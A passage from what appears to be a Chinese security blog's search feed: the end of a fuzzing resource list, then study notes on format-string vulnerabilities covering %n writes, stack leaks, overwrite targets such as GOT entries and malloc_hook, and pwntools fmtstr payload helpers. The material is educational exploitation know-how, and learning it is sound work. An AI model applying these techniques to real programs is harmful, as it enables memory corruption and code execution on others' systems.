href="https://googleprojectzero.blogspot.in/2016/06/a-year-of-windows-kernel-font-fuzzing-1_27.html">过去一年的Windows内核字体fuzzing第一部分成果</a></li><li><a href="https://googleprojectzero.blogspot.in/2016/07/a-year-of-windows-kernel-font-fuzzing-2.html">过去一年的Windows内核字体fuzzing第二部分技术</a></li><li><a href="https://blog.fuzzing-project.org/">fuzzing项目中有趣的bug和资源</a></li><li><a href="https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/">Fuzzing工作流程； fuzz工作从开始到结束</a></li><li><a href="http://jefftrull.github.io/c++/clang/llvm/fuzzing/sanitizer/2015/11/27/fuzzing-with-sanitizers.html">用AFL和libFuzzer轻松介绍C++代码fuzzing </a></li><li><a href="https://www.mwrinfosecurity.com/our-thinking/15-minute-guide-to-fuzzing/">15分钟fuzzing介绍 </a></li></ul><hr><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><ul><li><a href="https://www.amazon.com/Fuzzing-Brute-Force-Vulnerability-Discovery/dp/0321446119">《模糊测试-强制性安全漏洞发掘》</a></li></ul><hr><h2 id="课程"><a href="#课程" class="headerlink" title="课程"></a>课程</h2><ul><li><a href="https://vimeo.com/5236104">Fuzzing 101 </a></li><li><a href="https://www.youtube.com/">YouTube</a></li></ul><hr><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="http://lcamtuf.coredump.cx/afl/">AFL Fuzzer</a></li><li><a href="https://llvm.org/docs/LibFuzzer.html">libFuzzer Fuzzer</a></li><li><a href="https://resources.infosecinstitute.com/intro-to-fuzzing/#gref">Spike Fuzzer</a></li><li><a href="http://www.asm64.com/">EasyFuzzer</a></li></ul><hr>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞学习汇总笔记</title>
    <link href="/2019/03/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%B1%87%E6%80%BB%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/03/02/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%B1%87%E6%80%BB%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>久仰”系统实战篇”,最近终于拜读了这本神作,在格式化串漏洞部分令我受益良多</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>格式化字符串的格式如下:</p><p>%[parameter][flags][field width][.precision][length]type</p><p>知道漏洞怎么利用的第一步当然是知道漏洞是怎么发生的:</p><ul><li>使用格式化字符串的函数有:</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span></span>;                       <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(FILE *stream, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span></span>;        <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dprintf</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span></span>;              <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> *str, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span></span>; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">snprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> *str, <span class="hljs-type">size_t</span> size, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span></span>;<br>......<br><br></code></pre></td></tr></table></figure><ul><li><p>格式化符:</p><ul><li><p>整数: </p><pre><code class="hljs">  %d,%i,%u,%o,%x</code></pre></li><li><p>浮点数:</p><pre><code class="hljs">  %e,%f,%g,%a</code></pre></li><li><p>字符:</p><pre><code class="hljs">   %c</code></pre></li><li><p>特殊字符: </p><pre><code class="hljs">     %s: 视为指向字符串的指针,以字符串的形式输出参数     %n: 视为指向整数的指针,于参数前输出的字符数量将存于所指向的地址</code></pre></li><li><p>小技巧:</p><pre><code class="hljs">   1. 使用%p获取对应栈内存     2. 使用%s获取变量所对应的地址内容(有00截断)   3. %order$x(s)来直接读取对应参数</code></pre></li></ul></li></ul><h2 id="利用所需满足的条件"><a href="#利用所需满足的条件" class="headerlink" title="利用所需满足的条件:"></a>利用所需满足的条件:</h2><ul><li>可控制参数,并可以将输出字符写入任意区域</li><li>宽度格式字符允许用任意长度填充输出,因此可以修改单字节</li></ul><h2 id="一些有意思的地址"><a href="#一些有意思的地址" class="headerlink" title="一些有意思的地址:"></a>一些有意思的地址:</h2><ul><li>保存的返回地址</li><li>全局偏移表GOT</li><li>析构函数表</li><li>C函数库钩子(malloc_hook,realloc_hook,free_hook)</li><li>atexit结构</li><li>函数指针 : c++ vtables,回调函数</li></ul><h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><ul><li>改写保存的返回地址</li><li>改写其他函数指针</li><li>改写指向异常处理的指针,然后引起异常</li><li>改写GOT条目</li><li>改写atexit处理程序</li><li>改写DTORS区段的条目</li><li>用非i空数据改写空值终止符,将其转化为堆&#x2F;栈溢出</li><li>改写特殊数据,如(uid或gid)</li><li>修改字符串中包含的命令反映所选命令</li><li>泄露内存<ul><li>栈内存:<ul><li>某变量对应内存</li><li>某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存:<ul><li>利用GOT表得到libc基地址</li></ul></li></ul></li></ul><p>如果程序开启了NX保护,可以先利用%n类格式符,将shellcode写至内存地址;<br>也可以先写一个小的shellcode来寻找一大片可以写入的shellcode然后利用</p><h2 id="辅助利用模块-pwntools"><a href="#辅助利用模块-pwntools" class="headerlink" title="辅助利用模块(pwntools)"></a>辅助利用模块(pwntools)</h2><p>pwntools的pwnlib.fmtstr模块提供了一些格式化字符串漏洞的相关利用工具:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">class pwnlib.fmtstr.FmtStr(execute_fmt, <span class="hljs-attribute">offset</span>=None, <span class="hljs-attribute">padlen</span>=0, n <span class="hljs-attribute">umbwritten</span>=0)<br></code></pre></td></tr></table></figure><p>各参数意义如下:</p><ul><li>execute_fmt (function)：与漏洞进程进行交互的函数 </li><li>offset (int)：所控制的第一个格式化程序的偏移量 </li><li>padlen (int)：在 paylod 之前添加的 pad 的大小 </li><li>numbwritten (int)：已经写入的字节数</li></ul><p>还有自动生成payload的fmtstr_payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pwnlib.fmtstr.fmtstr_payload(offset, writes, <span class="hljs-attribute">numbwritten</span>=0, writ <span class="hljs-attribute">e_size</span>=<span class="hljs-string">&#x27;byte&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>其中各参数意义如下:</p><ul><li>offset (int)：所控制的第一个格式化程序的偏移量 </li><li>writes (dict)：格式为 {addr: value, addr2: value2}，用于往 addr 里写入 value的值</li><li>numbwritten(int): 已经由 printf 函数写入的字节数 </li><li>write_size (str)：必须是 byte，short 或 int。告诉你是要逐 byte 写，逐 short 写还是逐 int 写（hhn，hn或n）</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
